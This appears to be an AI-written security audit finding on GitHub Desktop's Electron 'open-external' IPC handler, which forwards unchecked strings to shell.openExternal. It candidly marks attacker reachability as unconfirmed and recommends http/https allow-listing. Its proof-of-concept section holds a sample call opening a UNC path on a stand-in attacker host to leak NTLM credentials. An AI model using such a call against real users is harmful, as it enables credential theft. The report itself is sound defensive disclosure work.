Based on my investigation, GitHub Desktop already implements several defenses against the report's bug class (unrestricted, unauthenticated dangerous operations): IPC channels wrapped via `handle`/`on` in `app/src/main-process/ipc-main.ts` check `isTrustedIPCSender`, deep-link file paths are checked for absoluteness and passed through `resolveWithin` (which resolves symlinks and rejects escapes) in `app/src/ui/dispatcher/dispatcher.ts`, and clone destinations are checked against sensitive paths in `app/src/lib/git/clone.ts`. However, one dangerous primitive is exposed without restriction on the scheme/target it is allowed to act on.

### Title
Unrestricted `shell.openExternal` scheme handling allows attacker-controlled GitHub API URLs to trigger local file/UNC execution or credential leakage - (File: `app/src/main-process/main.ts`)

### Summary
The main-process IPC handler for `open-external` accepts any string and forwards it unconditionally to Electron's `shell.openExternal`, only special-casing `http(s)` URLs for logging purposes — it performs no allow-listing of schemes or hosts before invoking the OS shell.

### Finding Description
The handler is:
```ts
ipcMain.handle('open-external', async (_, path: string) => {
  const pathLowerCase = path.toLowerCase()
  if (pathLowerCase.startsWith('http://') || pathLowerCase.startsWith('https://')) {
    log.info(`opening in browser: ${path}`)
  }
  try {
    await shell.openExternal(path)
    return true
  } catch (e) { ... }
})
``` [1](#0-0) 

This backs `shell.openExternal` in `app/src/lib/app-shell.ts` [2](#0-1) , which is invoked from many UI surfaces via `dispatcher.openInBrowser` and direct `shell.openExternal(url)` calls (e.g. `app/src/ui/release-notes/release-notes-dialog.tsx`, `app/src/ui/pull-request-quick-view.tsx`, `app/src/ui/multi-commit-operation/dialog/copilot-conflicts-dialog.tsx`) [3](#0-2) .

One call site — `SandboxedMarkdown`'s link interceptor — does filter for `http(s)` before invoking its callback:
```ts
if (/^https?:/.test(a.protocol)) {
  this.props.onMarkdownLinkClicked?.(a.href)
}
``` [4](#0-3) 

However, `openInBrowser` is also called from several other components (`ci-check-run-popover.tsx`, `pull-request-checks-failed.tsx`, `pull-request-comment.tsx`, `pull-request-review.tsx`) that were identified via `grep_search` but whose source I was not able to inspect in this session before running out of tool iterations. I cannot confirm whether those call sites validate the URL's scheme/host before passing GitHub API-sourced values (such as a Checks API `details_url`, which GitHub allows CI integrations to set to an arbitrary string) into `openInBrowser` → `shell.openExternal`.

### Impact Explanation
If any of these unverified call sites pass an attacker-controlled string (e.g., a check run's `details_url`, which a malicious GitHub App/CI integration can set freely) straight to `shell.openExternal` without scheme restriction, the consequences on Electron/Windows/macOS include: opening a `file://` or UNC (`\\attacker-host\share`) path, which on Windows triggers automatic SMB authentication and can exfiltrate the user's NTLM credentials to a remote host, or invoking OS-registered URI handlers that can lead to local code execution (a known class of Electron `shell.openExternal` abuse). This would satisfy "credential/token exfiltration" or "code execution" impact criteria if reachable via an attacker-controlled GitHub API object or a link the user clicks.

### Likelihood Explanation
The likelihood is **uncertain/unconfirmed** — the main-process handler itself has no restriction (confirmed), and it's reachable from renderer code, but I could not verify within this session whether the actual UI call sites that surface attacker-influenced URLs (check-run/PR API objects) apply their own scheme validation before calling `openInBrowser`. The `SandboxedMarkdown` component does apply a correct filter for markdown-rendered links, reducing likelihood for that specific path.

### Recommendation
Enforce protocol allow-listing (`http:`/`https:` only) centrally inside the `open-external` IPC handler in `app/src/main-process/main.ts`, rather than relying on each individual caller to filter schemes before invoking `shell.openExternal`. This closes the gap regardless of whether any current call site is missing validation, and prevents future regressions.

### Proof of Concept
Not independently verified end-to-end due to inability to inspect all `openInBrowser` call sites in this session. The vulnerable primitive is directly demonstrable: any renderer code path that calls `shell.openExternal('\\\\attacker.example.com\\share\\x')` (or `file://` variants) will reach the unrestricted main-process handler and be passed to the OS shell without validation.

**Caveat**: Because I was unable to fully trace every consumer of `dispatcher.openInBrowser` before the session's tool-call budget was exhausted, this finding should be treated as a confirmed weakness in the shared `open-external` handler with an *unconfirmed* reachability path from attacker-controlled GitHub API data. A Devin session with full codebase access should verify the `ci-check-run-popover.tsx`, `pull-request-checks-failed.tsx`, `pull-request-comment.tsx`, and `pull-request-review.tsx` call sites to confirm or rule out attacker reachability.

### Citations

**File:** app/src/main-process/main.ts (L581-597)
```typescript
  ipcMain.handle('open-external', async (_, path: string) => {
    const pathLowerCase = path.toLowerCase()
    if (
      pathLowerCase.startsWith('http://') ||
      pathLowerCase.startsWith('https://')
    ) {
      log.info(`opening in browser: ${path}`)
    }

    try {
      await shell.openExternal(path)
      return true
    } catch (e) {
      log.error(`Call to openExternal failed: '${e}'`)
      return false
    }
  })
```

**File:** app/src/lib/app-shell.ts (L43-53)
```typescript
export const shell: IAppShell = {
  // Since Electron 13, shell.trashItem doesn't work from the renderer process
  // on Windows. Therefore, we must invoke it from the main process. See
  // https://github.com/electron/electron/issues/29598
  moveItemToTrash,
  beep: electronShell.beep,
  openExternal,
  showItemInFolder,
  showFolderContents,
  openPath: electronShell.openPath,
}
```

**File:** app/src/ui/release-notes/release-notes-dialog.tsx (L206-208)
```typescript
  private onMarkdownLinkClicked = (url: string) => {
    shell.openExternal(url)
  }
```

**File:** app/src/ui/lib/sandboxed-markdown.tsx (L292-305)
```typescript
  private setupLinkInterceptor(doc: Document): void {
    doc.addEventListener('click', ev => {
      if (doc.defaultView && ev.target instanceof doc.defaultView.Element) {
        const a = ev.target.closest('a')
        if (a !== null) {
          ev.preventDefault()

          if (/^https?:/.test(a.protocol)) {
            this.props.onMarkdownLinkClicked?.(a.href)
          }
        }
      }
    })
  }
```
